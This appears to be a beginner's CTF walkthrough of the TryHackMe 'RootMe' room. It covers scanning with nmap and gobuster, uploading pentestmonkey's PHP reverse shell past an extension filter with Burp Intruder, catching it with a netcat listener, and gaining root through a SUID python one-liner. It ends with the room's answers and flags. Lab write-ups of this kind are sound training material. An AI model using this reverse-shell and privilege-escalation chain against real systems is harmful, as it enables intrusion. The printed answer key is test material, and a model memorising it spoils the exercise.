# ♦ Day 10
</br>
</br>

## ◙ ***TRYHACKME ROOM***
 </br>
 
# ♦ [RootMe](https://tryhackme.com/r/room/rrootme) : 
   ⇨ A ctf for beginners, can you root me? 
   </br>
   </br>
### ◙ Step-By-Step Guide 



### • 1. Start yor machine and set up your Vpn and stuff as shown in previous Repo's.

![Screenshot 2024-06-19 181441](https://github.com/Izumi0XD/CYBER_SECURITY_NOTES/assets/141332753/9f832b05-537c-4f1a-b5ee-0be45087e526)

### • 2. As the Task 2 is asking for how many ports are iopen so we are exactly gonna scan the ports and this process of gathering informations bya scanning and stuff is is also known as ***RECONNAISSANCE*** as like a professional name for doint scanning and stuff. Anyway we will do scanning using nmap and cammaod for taht is :
    nmap -sV >IP add<
</br>
⇨ as we can see that the there are 2 services are alive </br>
     Service --- Version </br>
  1.  ssh    - OpenSSH               (Secure Shell) </br>
  2.  http   - Apache httpd 2.4.29   (Hypertext Transfer Protocol).</br>


### • 3. The next task is to find hidden directory as we already know that for finding hidden directories we use ***gobuster***.
    gobuster dir -u >IP add< -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

⇨ As we can see that there are 5 hidden directories in total whaich are as
1. /css -  just a basic css page.
2. /js  -  is a java script page.
3. /uplaods  -  a page where all the uplaoded file are being stored.
4. /panel  -  an interface based page where we can uplaod files.
5. /server  -  a permission denied page.

### • 4. Now for getting into the server and collecting required data (i.e user.txt in task 3) we will upload a reverse shell (which will bring back a connection back from server back to our device)
the suggested reverse shel for this experiment is a shell by ***Pentestmonkey*** by using command -

    wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
⇨ After downlaoding the file we have to extract it and the open it by nano or mousepad or vscode whatever we just have to change it's ip and port no.</br>
⇨ For ip[ we have to provide tun0's ip and port can be any port which is not in use or we won't use.
### • 5. For uploading this file we will use a new tool known as ***Burpsuite*** thi sis a very good for pentresting and stuff on webpages. So now we have to set our burpsuite by doing folloing steps.
  • 1. Firstly we have to install an extension on any browser we are gonna use it's name is "[FoxyProxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/)"
  
  • 2. Now we have to set our proxy to work for tht we have to go to our ***Burpsuite > Proxy > Setting > Then we have to set our port no > Then we will set our FoxyProxy's port no and number***
  
  • 3. Ok now whhen its it done we can open ***Intruder*** and now we can interfere with the files which are goihng to the server

  ### • 6. Now we have to bruteforce our php file by different php extensions given [Here](https://book.hacktricks.xyz/pentesting-web/file-upload)

   By doing this the intrtuder will try all the given php extensions and we can sucessfully upload our php file.

### • 7. Now for getting a connection back we simply have to open netcat listner in a terminal and then run tht uploaded php file
   for using netcat we have to give the given command 
        
    nc -lvnp >Port no. tht was given in shell<

### • 8. Now to find our desired file we have to rrun a find command like

    find / -type f -name user.txt 2> /dev/null
 or 
 
    find / -type f -name user.txt


    
   now we just have to cat the result 

     cat /var/www/user.txt

### • 9. Privilege Esclation

   To gain root acess we have to run a privilege esclation command to find th ecode we gtg at GFTOBins [Website](https://gtfobins.github.io/), and run the given command
         
        python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

Now we are root user to confirm tht ewe have to use ***whoami*** command 
 now to find the root.txt file we simply have to use

    find / -type f -name root.txt 
    cat /root/root.txt


# ♦ ANSWERS :

## ◙ TASK 2 :

⍰. Scan the machine, how many ports are open?

   ⇨ 2

⍰. What version of Apache is running?

   ⇨ 2.4.29

⍰. What service is running on port 22?

   ⇨ ssh

⍰. What is the hidden directory?

   ⇨/panel/

## ◙ TASK 3 :

⍰. user.txt

   ⇨ THM{y0u_g0t_a_sh3ll}

## ◙ TASK 4 :

⍰. Search for files with SUID permission, which file is weird?

   ⇨ /usr/bin/python

⍰. root.txt

   ⇨ THM{pr1v1l3g3_3sc4l4t10n}
